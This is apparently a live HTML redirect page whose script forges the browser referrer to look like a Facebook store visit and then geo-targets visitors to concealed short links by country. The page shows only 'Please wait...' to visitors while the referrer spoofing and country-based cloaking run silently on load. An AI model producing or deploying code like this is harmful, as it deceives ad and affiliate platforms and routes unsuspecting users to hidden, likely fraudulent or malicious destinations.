<!DOCTYPE html>
<html>
<head>
  <meta name="referrer" content="no-referrer"/>
  <meta charset="utf-8">
  <title>Redirecting...</title>
  <script>


    // start of the finction that generates random string
      const generateRandomString = (length) => {
    let result = '';
    const characters =
      'AfbOR_xF-xJoz29YT7IsqdqG9IAtyPb4dHRKAFzhK2dIyrIrzT2KIpNYHV0Ha9nd4rmapyuQ';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  };


  // end of the finction that generates random string

  // change the referrer of the page to a giving website

      Object.defineProperty(document, "referrer", {get : function(){ return "https://m.facebook.com/ValamericaStore"+"?paipv=0&eav="+generateRandomString(72)+"&_rdc=1&_rdr"; }});


    /*!
     * GeoIP Target Redirector
     * Project: https://github.com/OpenAff/geoip-target-filter
     *
     * ---------------------------------------------------------------------
     * A small snippet for geo-target redirection using GeoIP API.
     * Add your targeted country's "ISO 3166-1 - Alpha-2" code and
     * redirect URL to the "target" array object.
     * ---------------------------------------------------------------------
     * Example:
     *          target.All = "http://others.tld";
     *          target.US  = "http://domain.tld";
     *
     * The above example will redirect all the US visitors to the given URL.
     * And any non-targeted visitors to "All" URL.
     * ---------------------------------------------------------------------
     * Country Codes can be found @( Wikipedia - http://bit.ly/nWBMYz )
     * See Column: "Alpha-2 Code"
     * ---------------------------------------------------------------------
     */

        var target = []; // Create a new target Array.

        // Example Codes:
    //    target.All = "https://oyovacationhomes.com/wp-content/uploads/2017/08/Leisure_Company_Profile.pdf";
        // the real link

        target.All = "https://litl.si/8a3sY";
        target.BE = "https://vert.si/RUb6qe";
        target.NL = "https://litl.si/8a3sY";
        target.FR = "https://vert.si/9IGlSL";
        target.IT = "https://clickm.me/ipE0Ys";
        target.UK = "https://vert.si/-5JjgH";
        target.ES = "https://vert.si/GJCS_L";


        // ------------------------------------------------------
        // DON'T EDIT THE BELOW CODE UNLESS REQUIRED
        // ------------------------------------------------------
        /**
         * If a valid country code matches the targets list, then it redirects to that particular link.
         * Otherwise redirects to "All" target URL.
         */
        function geoip(g){window.top.location.href=target[g.country]||target.All}
  </script>
  <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
</head>

    <p>Please wait...</p>
